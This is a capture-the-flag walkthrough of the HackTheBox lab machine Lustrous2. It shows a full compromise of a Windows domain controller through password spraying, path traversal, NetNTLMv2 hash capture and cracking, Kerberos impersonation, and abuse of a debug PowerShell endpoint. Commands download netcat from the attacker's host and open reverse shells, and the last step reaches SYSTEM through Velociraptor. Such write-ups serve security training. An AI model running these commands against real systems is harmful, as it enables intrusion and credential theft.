---
icon: drupal
cover: ../../../../.gitbook/assets/Screenshot 2026-02-03 214126.png
coverY: 0
---

# HTB-LUSTROUSTWO(VL)

<figure><img src="../../../../.gitbook/assets/image (128).png" alt=""><figcaption></figcaption></figure>

### Reconnaissance

#### Initial Port Scan

I started with a comprehensive port scan using Rustscan to identify all open ports.

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Lustrous2]
└─$ rustscan -a 10.122.218.23 -- -sCV
```

**Results - 24 Open Ports:**

* **21/tcp** - FTP (Microsoft FTP, Anonymous login allowed)
* **53/tcp** - DNS (Simple DNS Plus)
* **80/tcp** - HTTP (Microsoft IIS 10.0)
* **88/tcp** - Kerberos
* **135/tcp** - MSRPC
* **139/tcp** - NetBIOS-SSN
* **389/tcp** - LDAP
* **445/tcp** - SMB
* **464/tcp** - kpasswd5
* **593/tcp** - HTTP-RPC-EPMAP
* **636/tcp** - LDAPS
* **3268/tcp** - Global Catalog LDAP
* **3269/tcp** - Global Catalog LDAPS
* **3389/tcp** - RDP
* **5985/tcp** - WinRM
* **9389/tcp** - ADWS

**Key Findings:**

* Target is a **Windows Domain Controller**
* **Domain:** Lustrous2.vl
* **Hostname:** LUS2DC.Lustrous2.vl
* **NTLM:** Disabled (Kerberos-only authentication)
* **FTP:** Anonymous access allowed

#### DNS & Host Configuration

I generated a proper hosts file entry using netexec:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Lustrous2]
└─$ netexec smb 10.122.218.23 --generate-hosts-file hosts

┌──(sn0x㉿sn0x)-[~/HTB/Lustrous2]
└─$ cat hosts
10.122.218.23     LUS2DC.Lustrous2.vl Lustrous2.vl LUS2DC

┌──(sn0x㉿sn0x)-[~/HTB/Lustrous2]
└─$ cat hosts /etc/hosts | sudo sponge /etc/hosts
```

**Clock Synchronization:**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Lustrous2]
└─$ sudo ntpdate lus2dc.lustrous2.vl
```

***

### Enumeration

#### HTTP (Port 80)

The web server returned a 401 Unauthorized error, indicating authentication is required.

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Lustrous2]
└─$ curl -I http://10.122.218.23
HTTP/1.1 401 Unauthorized
Server: Microsoft-IIS/10.0
WWW-Authenticate: Negotiate
```

Directory brute-forcing revealed only default IIS files:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Lustrous2]
└─$ feroxbuster -u http://10.122.218.23
```

No interesting paths discovered.

#### SMB (Port 445)

NTLM authentication is disabled on this domain controller:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Lustrous2]
└─$ netexec smb 10.122.218.23 -u guest -p ''
SMB         10.122.218.23  445    LUS2DC           [*]  x64 (name:LUS2DC) (domain:Lustrous2.vl) (signing:True) (SMBv1:False) (NTLM:False)
SMB         10.122.218.23  445    LUS2DC           [-] Lustrous2.vl\guest: STATUS_NOT_SUPPORTED
```

Kerberos authentication also failed without valid credentials:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Lustrous2]
└─$ netexec smb 10.122.218.23 -u guest -p '' -k
SMB         10.122.218.23  445    LUS2DC           [-] Lustrous2.vl\guest: KDC_ERR_ETYPE_NOSUPP
```

#### FTP (Port 21) - Critical Discovery

Anonymous FTP access was enabled:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Lustrous2]
└─$ ftp anonymous@lus2dc.lustrous2.vl
Connected to LUS2DC.Lustrous2.vl.
220 Microsoft FTP Service
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
```

**Directory Structure:**

```
ftp> ls
09-06-24  05:20AM       <DIR>          Development
04-14-25  04:44AM       <DIR>          Homes
08-31-24  01:57AM       <DIR>          HR
08-31-24  01:57AM       <DIR>          IT
04-14-25  04:44AM       <DIR>          ITSEC
08-31-24  01:58AM       <DIR>          Production
08-31-24  01:58AM       <DIR>          SEC
```

**ITSEC Directory:**

```
ftp> cd ITSEC
ftp> ls
09-07-24  03:50AM                  207 audit_draft.txt

ftp> get audit_draft.txt
```

**audit\_draft.txt contents:**

```
Audit Report Issue Tracking

[Fixed] NTLM Authentication Allowed
[Fixed] Signing & Channel Binding Not Enabled
[Fixed] Kerberoastable Accounts
[Fixed] SeImpersonate Enabled

[Open] Weak User Passwords
```

**Key Finding:** The note about "Weak User Passwords" suggests password spraying might be effective.

**Homes Directory - User Enumeration:**

```
ftp> cd Homes
ftp> ls
09-07-24  12:03AM       <DIR>          Aaron.Norman
09-07-24  12:03AM       <DIR>          Adam.Barnes
09-07-24  12:03AM       <DIR>          Amber.Ward
[... 68 more users ...]
09-07-24  12:03AM       <DIR>          ShareSvc
09-07-24  12:03AM       <DIR>          Wayne.Taylor
```

I extracted all 71 usernames to a file named `users.txt`.

#### Kerberos (Port 88) - Username Validation

I validated the usernames using kerbrute:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Lustrous2]
└─$ kerbrute userenum -d lustrous2.vl --dc lus2dc.lustrous2.vl users.txt
```

**Result:** All 71 usernames were confirmed as valid domain accounts!

***

### Initial Access - User Thomas.Myers

#### Password Spraying Attack

Based on the "Weak User Passwords" hint, I performed password spraying with common passwords related to the domain name.

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Lustrous2]
└─$ kerbrute passwordspray -d lustrous2.vl --dc lus2dc.lustrous2.vl users.txt Lustrous2024
```

**Success:**

```
[+] VALID LOGIN:  Thomas.Myers@lustrous2.vl:Lustrous2024
```

**Credentials Found:**

* **Username:** Thomas.Myers
* **Password:** Lustrous2024

#### Verification

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Lustrous2]
└─$ netexec smb lus2dc.lustrous2.vl -u thomas.myers -p Lustrous2024 -k
SMB         lus2dc.lustrous2.vl 445    lus2dc           [+] lustrous2.vl\thomas.myers:Lustrous2024
```

#### BloodHound Collection

First, I installed BloodHound.py with required dependencies:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Lustrous2]
└─$ uv tool install git+https://github.com/dirkjanm/BloodHound.py.git@bloodhound-ce --with ldap3-bleeding-edge
```

Then collected AD data:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Lustrous2]
└─$ bloodhound-ce-python -u thomas.myers -no-pass -k -d lustrous2.vl -ns 10.122.218.23 --ldap-channel-binding -c All --zip
```

No immediate privilege escalation paths were visible from thomas.myers in BloodHound.

***

### Web Application Access

#### Kerberos Configuration

I configured Kerberos authentication on my attack machine:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Lustrous2]
└─$ netexec smb lus2dc.lustrous2.vl --generate-krb5-file krb5.conf

┌──(sn0x㉿sn0x)-[~/HTB/Lustrous2]
└─$ sudo cp krb5.conf /etc/krb5.conf
```

**krb5.conf contents:**

```ini
[libdefaults]
    dns_lookup_kdc = false
    dns_lookup_realm = false
    default_realm = LUSTROUS2.VL
    default_ccache_name = FILE:/home/%{username}/krb5cc

[realms]
    LUSTROUS2.VL = {
        kdc = lus2dc.Lustrous2.vl
        admin_server = lus2dc.Lustrous2.vl
        default_domain = Lustrous2.vl
    }

[domain_realm]
    .Lustrous2.vl = LUSTROUS2.VL
    Lustrous2.vl = LUSTROUS2.VL
```

**Obtain TGT:**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Lustrous2]
└─$ kinit thomas.myers
Password for thomas.myers@LUSTROUS2.VL: Lustrous2024

┌──(sn0x㉿sn0x)-[~/HTB/Lustrous2]
└─$ klist
Ticket cache: FILE:/home/sn0x/krb5cc
Default principal: thomas.myers@LUSTROUS2.VL

Valid starting       Expires              Service principal
07/25/2025 15:11:43  07/26/2025 01:11:43  krbtgt/LUSTROUS2.VL@LUSTROUS2.VL
```

#### Testing Web Access with curl

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Lustrous2]
└─$ curl -I --negotiate -u : http://lus2dc.lustrous2.vl
HTTP/1.1 200 OK
```

Success! The website now accepts Kerberos authentication.

#### Firefox Configuration

I configured Firefox to use Kerberos authentication:

1. Navigate to `about:config`
2. Set `network.negotiate-auth.trusted-uris` to `.lustrous2.vl`
3. Verify `network.negotiate-auth.using-native-gsslib` is `true`

The web application loaded successfully showing a simple file download interface with an `audit.txt` file.

***

### Exploitation - Path Traversal to NetNTLMv2

#### Discovering Path Traversal

The download functionality used a `fileName` parameter:

```
GET /File/Download?fileName=audit.txt
```

**Testing for Path Traversal:**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Lustrous2]
└─$ curl --negotiate -u : http://lus2dc.lustrous2.vl/File/Download?fileName=../../../../windows/system32/drivers/etc/hosts
```

**Success!** The hosts file contents were returned, confirming path traversal vulnerability.

#### Capturing NetNTLMv2 Hash

Windows will attempt to authenticate when accessing UNC paths. I started Responder:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Lustrous2]
└─$ sudo /opt/Responder/Responder.py -I tun0
```

Then triggered authentication to my machine:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Lustrous2]
└─$ curl --negotiate -u : http://lus2dc.lustrous2.vl/File/Download?fileName=//10.10.12.31/share/test
```

**Responder Captured:**

```
[SMB] NTLMv2-SSP Client   : 10.122.218.23
[SMB] NTLMv2-SSP Username : LUSTROUS2\ShareSvc
[SMB] NTLMv2-SSP Hash     : ShareSvc::LUSTROUS2:71fb2c9d9e59ca43:95F26661B93F71027F974D7B54F88675:...
```

**Critical Finding:** The web application runs as **ShareSvc** account!

#### Cracking the Hash

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Lustrous2]
└─$ hashcat sharesvc.netntlmv2 /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```

**Cracked Password:** #1Service

**Verification:**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Lustrous2]
└─$ netexec smb lus2dc.lustrous2.vl -u sharesvc -p '#1Service' -k
SMB         lus2dc.lustrous2.vl 445    lus2dc           [+] lustrous2.vl\sharesvc:#1Service
```

***

### Privilege Escalation to ShareAdmins

#### Discovering Web Application Source

Using the path traversal, I downloaded the web.config file:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Lustrous2]
└─$ curl --negotiate -u : http://lus2dc.lustrous2.vl/File/Download?fileName=../../web.config
```

**web.config revealed:**

```xml
<aspNetCore processPath="dotnet" arguments=".\LuShare.dll" ... />
```

**Downloaded the DLL:**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Lustrous2]
└─$ curl --negotiate -u : http://lus2dc.lustrous2.vl/File/Download?fileName=../../LuShare.dll --output LuShare.dll
```

#### Reverse Engineering LuShare.dll

Using DotPeek, I discovered several interesting endpoints:

1. **/File/Upload** - Restricted to ShareAdmins role
2. **/File/Debug** - Restricted to ShareAdmins role (PowerShell execution!)

**Debug Controller (Simplified):**

```csharp
[Authorize(Roles = "ShareAdmins")]
[HttpPost]
public IActionResult Debug(string command, string pin)
{
    string hardcodedPin = "ba45c518";
    
    if (pin == hardcodedPin) {
        // Execute PowerShell command in ConstrainedLanguage mode
        PowerShell ps = PowerShell.Create();
        ps.Runspace.SessionStateProxy.LanguageMode = PSLanguageMode.ConstrainedLanguage;
        ps.AddScript(command);
        return Content(ps.Invoke().ToString());
    }
    return BadRequest("Invalid PIN.");
}
```

**Key Findings:**

* Debug endpoint executes PowerShell commands
* Hardcoded PIN: **ba45c518**
* Requires **ShareAdmins** role membership

#### Kerberos Delegation - Impersonating ShareAdmins Member

I discovered ShareSvc has delegation configured, allowing it to impersonate other users.

**Using getST.py to impersonate Ryan.Davies (ShareAdmins member):**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Lustrous2]
└─$ getST.py -self -impersonate ryan.davies -k 'LUSTROUS2.VL/ShareSvc:#1Service' -altservice HTTP/lus2dc.lustrous2.vl
```

**Output:**

```
[*] Impersonating ryan.davies
[*] Requesting S4U2self
[*] Saving ticket in ryan.davies@HTTP_lus2dc.lustrous2.vl@LUSTROUS2.VL.ccache
```

**Export the ticket:**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Lustrous2]
└─$ export KRB5CCNAME=ryan.davies@HTTP_lus2dc.lustrous2.vl@LUSTROUS2.VL.ccache
```

**Verify access:**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Lustrous2]
└─$ curl --negotiate -u : http://lus2dc.lustrous2.vl -I
HTTP/1.1 200 OK
```

Now the web application recognizes me as Ryan.Davies (ShareAdmins member)!

***

### Shell as ShareSvc

#### Accessing Debug Endpoint

With Ryan.Davies' ticket, I now have access to `/File/Debug`.

**Testing whoami:**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Lustrous2]
└─$ curl --negotiate -u : http://lus2dc.lustrous2.vl/File/Debug -X POST -d "command=whoami /all&pin=ba45c518"
```

**Response showed:** Running as **LUSTROUS2\ShareSvc**

#### Uploading Netcat

The Debug endpoint has a 100-character command limit, so I used a two-stage approach.

**Stage 1 - Download nc64.exe:**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Lustrous2]
└─$ curl --negotiate -u : http://lus2dc.lustrous2.vl/File/Debug -X POST -d "command=iwr http://10.10.12.31/nc64.exe -outfile \programdata\nc64.exe&pin=ba45c518"
```

**Stage 2 - Execute reverse shell:**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Lustrous2]
└─$ curl --negotiate -u : http://lus2dc.lustrous2.vl/File/Debug -X POST -d "command=\programdata\nc64.exe 10.10.12.31 443 -e powershell&pin=ba45c518"
```

**Reverse shell received:**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Lustrous2]
└─$ rlwrap -cAr nc -lnvp 443
Connection received on 10.122.218.23 57529
Windows PowerShell

PS C:\inetpub\lushare>
```

***

### Privilege Escalation to SYSTEM

#### Discovery - Velociraptor Installation

Exploring the filesystem, I discovered Velociraptor installed:

```powershell
PS C:\Program Files> ls
Velociraptor
VelociraptorServer
```

**Velociraptor** is a digital forensics/incident response tool that typically runs with SYSTEM privileges.

**Server directory contents:**

```powershell
PS C:\Program Files\VelociraptorServer> ls
-a----  client.config.yaml
-a----  server.config.yaml
-a----  velociraptor-v0.72.4-windows-amd64.exe
```

#### Creating API Access

With access to `server.config.yaml`, I could create an API client configuration.

**Finding existing user (admin):**

```yaml
initial_users:
- name: admin
  password_hash: 43b7f91087b5a1bcb978d776a23330d3bf4a2c31017c0b1865ddae21c942e06d
```

**Generating API config:**

```powershell
PS C:\Program Files\VelociraptorServer> .\velociraptor-v0.72.4-windows-amd64.exe --config server.config.yaml config api_client --name admin --role administrator \programdata\api.config.yaml
```

Despite some errors about access denied, the API config was still created successfully in `\programdata\api.config.yaml`.

#### Testing API Access

```powershell
PS C:\Program Files\VelociraptorServer> .\velociraptor-v0.72.4-windows-amd64.exe --api_config \programdata\api.config.yaml query "SELECT * FROM info()" --format jsonl
```

**Response:**

```json
{"Hostname":"LUS2DC","IsAdmin":true,"Fqdn":"LUS2DC.Lustrous2.vl",...}
```

Success! The API is working.

#### Executing Commands as SYSTEM

Velociraptor has an `execve` plugin for command execution:

**Testing whoami:**

```powershell
PS C:\Program Files\VelociraptorServer> .\velociraptor-v0.72.4-windows-amd64.exe --api_config \programdata\api.config.yaml query "SELECT * FROM execve(argv=['powershell','-c','whoami'])"
```

**Output:**

```json
{
  "Stdout": "nt authority\\system\r\n",
  "ReturnCode": 0
}
```

**Perfect!** Commands execute as NT AUTHORITY\SYSTEM.

#### SYSTEM Shell

```powershell
PS C:\Program Files\VelociraptorServer> .\velociraptor-v0.72.4-windows-amd64.exe --api_config \programdata\api.config.yaml query "SELECT * FROM execve(argv=['C:\\programdata\\nc64.exe','-e','powershell','10.10.12.31','443'])"
```

**Reverse shell as SYSTEM:**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Lustrous2]
└─$ rlwrap -cAr nc -lnvp 443
Connection received on 10.122.218.23 57745
Windows PowerShell

PS C:\Windows\system32> whoami
nt authority\system
```

***

### Summary

This challenging Active Directory box demonstrated multiple attack vectors:

#### Attack Chain

```
FTP Anonymous → Usernames → Password Spray → thomas.myers
    ↓
Kerberos Auth → Web App Access → Path Traversal
    ↓
UNC Path → NetNTLMv2 → Crack Hash → ShareSvc
    ↓
Reverse DLL → Debug Endpoint Discovery → Kerberos Delegation
    ↓
Impersonate ShareAdmins → Debug RCE → ShareSvc Shell
    ↓
Velociraptor Discovery → API Config Creation → SYSTEM Execution
    ↓
NT AUTHORITY\SYSTEM
```
